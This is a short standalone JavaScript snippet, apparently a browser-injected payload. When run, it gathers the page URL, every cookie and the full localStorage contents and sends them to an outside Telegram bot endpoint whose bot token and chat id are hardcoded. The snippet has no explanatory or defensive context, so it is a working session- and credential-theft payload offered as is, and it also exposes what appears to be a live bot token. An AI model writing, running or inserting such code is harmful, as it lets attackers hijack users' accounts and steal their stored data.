(function(){
  var data = "URL: " + location.href + "\nCOOKIE: " + document.cookie + "\nLS: " + JSON.stringify(localStorage);
  fetch("https://api.telegram.org/bot9180172996:AAHU1Gs5ebN3m5_Xg5kdPqmLsw-_iZsNAxo/sendMessage", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:"7688059212", text:data})
  });
})();
